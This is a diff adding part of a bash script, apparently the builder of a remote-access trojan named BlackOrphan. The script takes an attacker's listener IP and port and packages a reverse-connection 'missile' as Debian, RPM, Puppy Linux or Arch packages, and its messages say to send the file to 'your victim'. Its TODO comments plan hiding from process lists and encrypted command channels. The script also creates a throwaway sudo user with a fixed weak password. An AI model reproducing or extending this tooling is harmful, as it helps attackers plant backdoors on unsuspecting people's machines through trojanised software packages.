+	elif [ -z "$l_ip" ];then
+
+	    printf "${open}${light}${yellow}[!]What happened to your listener ip ?\n\
+		Please Set a Listener${close}\n" \
+		   set_usage
+	    continue
+
+	fi
+
+	if [ -z "$l_port" ];then
+
+	    printf "${open}${light}${yellow}[!]Invalid Port or Port was not set${close}\n"
+	    set_usage
+	    continue
+
+	fi
+
+	! _intchk "${l_port}"
+	echo ""
+
+	printf "${open}${light}${yellow}[!]LHOST: %s\n" "$l_ip"
+	printf "[!]LPORT: %s\n" "$l_port"
+	printf "[!]Everything is now set, use the r (run) command ^_^\n\n${close}"
+
+	break
+    done
+}
+packaging(){
+    printf "\n${open}${light}${green}The Below details are needed for packaging the %s file${close}\n" \
+	   "${pPackage}"
+    while :
+    do
+	printf "${open}${light}${green}Enter Developer Email Address: ${close}" ; read email
+	echo ""
+	if [ -z "$email" ];then
+	    printf "\n${open}${light}${yellow}[!]Nothing was entered${close}\n"
+	else
+	    break
+	fi
+    done
+
+    while :
+    do
+	printf "${open}${light}${green}Enter a short Description: ${close}" ; read description
+	echo ""
+	if [ -z "$description" ];then
+	    printf "\n${open}${light}${yellow}[!]Nothing was entered${close}\n"
+	else
+	    break
+	fi
+    done
+
+    while :
+    do
+	printf "${open}${light}${green}Enter a version number for the Package[example: 0.1-1]: ${close}" ; \
+	read vnumber
+	echo ""
+	if [ -z "$vnumber" ];then
+	    printf "\n${open}${light}${yellow}[!]Nothing was entered${close}\n"
+	else
+	    break
+	fi
+    done
+
+    printf "\n"
+    printf "${open}${light}${yellow}[!]Email: %s\n" "$email"
+    printf "[!]Description: %s\n" "$description"
+    printf "[!]VersionNumber: %s${close}\n\n" "$vnumber"
+
+    printf "${open}${light}${yellow}[!]Building the Package...${close}\n"
+    sleep 5
+
+}
+
+shit_func(){
+
+
+    printf "\n${open}${light}${yellow}This is mainly use for reverse connetion from a site${close}\n\n"
+
+    while printf "${open}${light}${green}Specify the name you want to give to the missile: ${close}" ; \
+	  read dirfile
+    do
+	if [ -z "$dirfile" ];then
+	    printf "\n${open}${light}${yellow}Input is required${close}\n"
+	    continue
+
+	else
+	    break
+	fi
+    done
+
+    printf "\n${open}${light}${yellow}[!]Please wait while i send the missile to %s${close}\n" "$dirfile"
+    sleep 3
+      while printf "${open}${light}${green}Bind missile with (bashscript|pythonScript|perlScript)[y|n]:${close} " ; read $opt -e bindmissile
+      do
+        case $bindmissile in
+           y|Y)
+                chk_file;
+                break;
+                ;;
+          n|N)
+              _sh
+              break;
+              ;;
+          *)
+              printf "${open}${light}${red}Invalid Response${close}"
+              continue
+              ;;
+    esac
+  done
+    reset
+    printf "\n${open}${light}${green}You can now send it to your victim${close}\n"
+    box3d
+
+
+}
+####CREATE SERVER FUNCTION
+createserver(){
+    createserver_banner
+    while printf "${open}${light}${green}%s${close} " "${createserver}" ; read $opt -e cserversel
+    do
+	case $cserversel in
+
+	    1)  echo ""
+		hungerGames="$cserversel"
+		pPackage="debian"
+		cservprompt="${PS2}:create_server:debian_base"
+		general
+
+		;;
+	    2)  echo ""
+		hungerGames="$cserversel"
+		pPackage="rpm"
+		cservprompt="${PS2}:create_server:rpm_base"
+		general
+		;;
+	    3)  echo ""
+		hungerGames="$cserversel"
+		pPackage="pet(puppy LInux)"
+		cservprompt="${PS2}:create_server:puppy_linux"
+		general
+		;;
+	    4)  echo ""
+		hungerGames="$cserversel"
+		pPackage="ArchLinux"
+		cservprompt="${PS2}:create_server:arch_linux"
+		general
+		;;
+
+	    r) createserver_banner
+	       test ! -z "$l_ip" && test ! -z "$l_port" && \
+		   echo "\n${open}${light}${yellow}[!]Setting up the missile${close}\n" || replay
+	       sleep 4
+	       case $hungerGames in
+		   1)
+
+		       while printf "${open}${light}${green}Should i associate the missile with a %s package?[y|n]: ${close}" \
+				    "${pPackage}"; \
+			     read $opt -e inmissile
+		       do
+			   case $inmissile in
+			       y|Y)	dirfile="${0##*/}${SPID}"
+					echo ""
+					printf "${open}${light}${yellow}[!]Creating Directories and files, Please wait...${close}\n\n"
+					mkdir "$dirfile"
+					cd "$_" #### CD INTO THE LAST DIRECTORY "dirfile"
+					mkdir -p usr/local/bin && mkdir DEBIAN
+					cd usr/local/bin
+					sleep 3
+
+					chk_file
+
+					packaging
+					cd ../../../../
+
+					if echo "$bindscript" | grep -oE ".sh|.py|.pl" >> /dev/null 2>&1;then
+					    CUT_SHIT=${CUT_IT%%.*}
+					    mv "${dirfile}" "${CUT_SHIT}$vnum$vnumber"
+					    cd "$(pwd)/${CUT_SHIT}$vnum$vnumber/usr/local/bin/"
+					    mv ./* "${CUT_SHIT}"
+					    cd ../../../../
+					    control
+					    dpkg-deb --build "${CUT_SHIT}$vnum$vnumber"
+					    if [ $? = 0 ];then
+						rm -rf "${CUT_SHIT}$vnum$vnumber"
+					    else
+						echo "${open}${light}${red}Fatal Error${close}"
+						rm -rf "${CUT_SHIT}$vnum$vnumber"
+						exit 1
+					    fi
+					else
+
+					    printf "${open}${light}${yellow}Enter the name for your missile: ${close}" ; read mName
+					    mv "${dirfile}" "${mName}$vnum$vnumber"
+					    mv "${mName}$vnum$vnumber/usr/local/bin/"* "${mName}$vnum$vnumber/usr/local/bin/${mName}"
+					    cd "${mName}$vnum$vnumber/usr/local/bin"
+					    if ls | grep ".sh$" > /dev/null 2>&1;then
+						CUT_IT=${mName%.*}
+						mv "${mName}" "${CUT_IT}"
+						#which shc >>/dev/null 2>&1
+						#test $? != 0 && \
+						#echo -e "shc is not Installed on your computer:P\nThe target might see the content of the missile :P\nI \
+						#will continue setting up the missile without shc" && break
+						#shc -f ${CUT_IT} && mv ${CUT_IT}.x.c ${CUT_IT}.c
+						#gcc ${CUT_IT}.c -o ${CUT_IT} && rm ${CUT_IT}.c && rm ${CUT_IT}.x
+					    else
+
+						:
+
+					    fi
+
+					    cd ../../../../
+
+					    control2
+					    dpkg-deb --build "${mName}$vnum$vnumber"
+					    if [ $? = 0 ];then
+						rm -rf "${CUT_SHIT}$vnum$vnumber"
+					    else
+						echo "${open}${light}${red}Fatal Error${close}"
+						exit 1
+					    fi
+					    rm -rf "${mName}$vnum$vnumber"
+
+					fi
+
+					if [ $? = 0 ];then
+					    printf "${open}${light}${green}Ok we are done here..${close}\n"
+					    printf "${open}${light}${green}You can now send the deb file to your victim ${close}\n"
+					    sleep 3
+					    echo ""
+					    box3d
+					    break
+					    exit
+
+					else
+
+					    printf "${open}${light}${red}Error encountered while building debian package${close}\n"
+
+					fi
+
+					;;
+
+
+			       n|N)
+				   shit_func ;;
+
+			       *)
+				   echo "${open}${light}${red}Invalid Response${close}" && continue ;;
+			   esac
+		       done
+		       ;;
+		   2)
+		       while printf "${open}${light}${green}Should i associate the missile with a %s package?[y|n]: ${close}" "${pPackage}" ; \
+			     read $opt -e inmissile
+		       do
+			   case $inmissile in
+			       y)
+				   echo ""
+
+				   if [ ! "$( which rpm )" ];then
+
+				       printf "\n${open}${light}${yellow}[!]rpm is not installed on your computer\n[!]Installing RPM${close}\n" && \
+					   sleep 3 && \
+
+					   ##########################TESTING FOR INTERNET CONNECTIVITY#######################
+					   echo "${open}${light}${yellow}[!] Trying to install rpm ${close}" && \
+
+					   >/dev/tcp/google.com/80
+				       [ $? != 0 ] && \
+					   echo "${open}${light}${red}Please Check Your internet Conectivity or install rpm mannually or build a debian package and convert with alien${close}" && \
+					   exit $RANDOM
+
+				       apt-get update && apt-get install rpm
+				   else
+				       [ ! -d "$HOME/rpmbuild" ] && mkdir -p "$HOME/rpmbuild/{BUILD,BUILDROOT,RPMS,SOURCES,SPECS,SRPMS}"
+				   fi
+
+				   dirfile="${0##*/}${SPID}"
+				   mainlocation=$(pwd)
+				   cd "$HOME/rpmbuild/SOURCES"
+				   chk_file
+				   packaging
+				   cd "$HOME/rpmbuild/SPECS"
+				   _spec
+				   cd "$HOME/rpmbuild/SOURCES"
+				   mkdir "${CUT_IT}-${vnumber}"
+				   mv "${CUT_IT}" "${CUT_IT}-${vnumber}"
+				   tar -cvzf "${CUT_IT}-${vnumber}.tar.gz" "${CUT_IT}-${vnumber}"
+				   rm -rf "${CUT_IT}" "${CUT_IT}-${vnumber}"
+				   cd "$mainlocation"
+				   rpmbuild -v -bb "$HOME/rpmbuild/SPECS/${CUT_IT}.spec"
+				   mv "$HOME/rpmbuild/RPMS/noarch/${CUT_IT}-${vnumber}-1.noarch.rpm" .
+				   if [ $? = 0 ];then
+				       printf "${open}${light}${green}Ok we are done here..${close}\n"
+				       printf "${open}${light}${green}You can now send the rpm file to your victim${close}\n"
+				       sleep 3
+				       echo ""
+				       box3d
+				       break
+				       exit
+
+				   else
+
+				       printf "${open}${light}${red}Error encountered while building the rpm package${close}\n"
+				       exit $RANDOM
+
+				   fi
+
+				   ;;
+			       n|N)
+				   shit_func ;;
+			       *)
+				   echo "${open}${light}${red}Invalid Response${close}" && continue ;;
+			   esac
+		       done
+
+		       ;;
+		   3)
+		       while printf "${open}${light}${green}Should i associate the missile with a %s package?[y|n]: ${close}" "${pPackage}" ; \
+			     read $opt -e inmissile
+		       do
+			   case $inmissile in
+			       y|Y)
+				   dirfile="${0##*/}$SPID"
+				   mkdir "${dirfile}"
+				   cd "$_"
+				   chmod -R 777 "../${dirfile}"
+				   ! [ -x "../misc" -a -r "../misc" -a -w "../misc" ] && \
+				       chmod -R 777 "../misc"
+				   chk_file
+				   cd -
+				   mv "${dirfile}" "${CUT_IT}"
+				   echo "${open}${bold}${green}HIT ENTER AT ALL FIELDS${close}"
+				   sleep 3
+				   createpet "${CUT_IT}"
+				   rm -rf "${CUT_IT}"
+				   chmod 777 "${CUT_IT}.pet"
+				   box3d
+
+				   ;;
+			       n|N)
+				   shit_func
+				   ;;
+			       *)
+				   echo "${open}${bold}${red}Invalid response ${close}"
+				   continue ;;
+			   esac
+		       done
+
+		       ;;
+		   4)
+		       while printf "${open}${light}${green}Should i associate the missile with a %s package?[y|n]: ${close}" "${pPackage}" ; \
+			     read $opt -e inmissile
+		       do
+			   case $inmissile in
+			       y|Y)
+
+				   dirfile="${0##*/}$SPID"
+
+				   mkdir "${dirfile}"
+				   cd "$_"
+				   chmod -R 777 "../${dirfile}"
+				   ! [ -x "../misc" -a -r "../misc" -a -w "../misc" ] && \
+				       chmod -R 777 "../misc"
+				   chk_file;
+				   packaging
+           echo "---"
+				   mkdir "${CUT_IT}-${vnumber}"
+
+           echo "---"
+				   mv "${CUT_IT}" "$_"
+				   tar -cvf "${CUT_IT}-${vnumber}.tar.gz" "${CUT_IT}-${vnumber}"
+				   rm -rf "${CUT_IT}-${vnumber}"
+				   _pkgbuild
+				   chmod 777 PKGBUILD
+
+				   [ "$(whoami)" == "root" ] && \
+				       printf "\n\a${open}${light}${red}[!]I cannot Package If you are root${close}\n" && \
+				       {
+					   while printf "${open}${light}${green}%s\n%s: ${close}" \
+							"specify a user in your computer to package this file" \
+							"(note: password is not needed. if entry is null i will create a user \
+'WHICH WILL BE DELETED AFTER THE PACKAGING')"; \
+						 read myUser junk
+					   do
+
+					       [ -z "${myUser}" ] && myUser=blackorphan && \
+						   printf "\n${open}${bold}${green}Creating user blackorpahn...${close}\n" && \
+						   $(which useradd) "${myUser}" && \
+						   $(which usermod) "${myUser}" -s /bin/bash --password 123456 && \
+						   $(which adduser) "${myUser}" sudo && \
+						   $(which adduser) "${myUser}" admin && \
+
+						   break
+					       if [ $( grep ^"$myUser" /etc/passwd ) ];then
+						   break
+					       else
+						   printf "\n${open}${bold}${red}Invalid User has been specified\n"
+						   continue
+					       fi
+
+
+					   done
+
+
+
+				       }
+
+				   : ${myUser:=$(whoami)}
+				   [ "$(which bsdtar)" ] || {
+				       printf "${open}${bold}${red}[!]bsdtar is not installed on your BoX${close}\n" && \
+					   printf "${open}${bold}${yellow}[!]Trying to install bsdtar${close}" && \
+					   >/dev/tcp/google.com/80
+				       [ $? != 0 ] && \
+					   echo "${open}${light}${red}Please Check Your internet Conectivity or install bsdtar mannually${close}" && {
+					       [ "${myUser}" == "blackorphan" ] && \
+						   $(which userdel) "${myUser}" && exit $RANDOM
+
+					       exit $RANDOM
+					   }
+				       ##This is bad comeback here and fix this
+				       test { apt-get update && apt-get install bsdtar }  || yum install bsdtar
+
+				   }
+
+				   gksu -u "${myUser}" "../misc/makepkg -g >> PKGBUILD"
+
+				   [ $? != 0 ] && printf "\n\n${open}${bold}${red}Fatal Error..Exiting${close}\n" && exit $RANDOM
+				   gksu -u ${myUser} "../misc/makepkg"
+				   [ $? != 0 ] && printf "\n\n${open}${bold}${red}Fatal Error..Exiting${close}\n" && exit $RANDOM
+
+				   [ "${myUser}" == "blackorphan" ] && \
+
+				       echo "${open}${bold}${green}Removing User BlackOrphan${close}" && \
+
+				       $(which userdel) "${myUser}"
+
+				   cp ./*.pkg.* "../"
+				   rm -rf "../${dirfile}"
+
+				   printf "${open}${light}${green}Ok we are done here..${close}\n"
+				   printf "${open}${light}${green}You can now send the package to your victim${close}\n"
+				   sleep 3
+				   echo ""
+				   box3d
+				   break
+				   exit
+				   ;;
+
+			       n|N)
+				   shit_func ;;
+
+			       *)
+				   echo "${open}${bold}${red}Invalid response ${close}"
+				   ;;
+			   esac
+		       done
+
+		       ;;
+	       esac
+
+	       ;;
+	    b)
+		reset && _select && break ;;
+	    q) exit ;;
+	    *) 	createserver_banner
+		echo ""
+		printf "${open}${light}${yellow}[!]Invalid Selection <%s>${close}\n" "$cserversel" ;;
+	esac
+    done
+}
+#
+is_root
+header
+_select
+
+
+#TODO
+#1. Create Service for BlackOrpan
+#2. Handle Multiple connecitons
+#-----------------------------------------
+#3. Hide BlackOrphan from running process
+#----------------------------------------
+#4. Encrypt the commands sent to targets computer
+#5. Decrypt the commands on targets commands, encrypt the results and send it back to attacker
+#6. GUI for BLACKORPHAN witk tcl/tk 
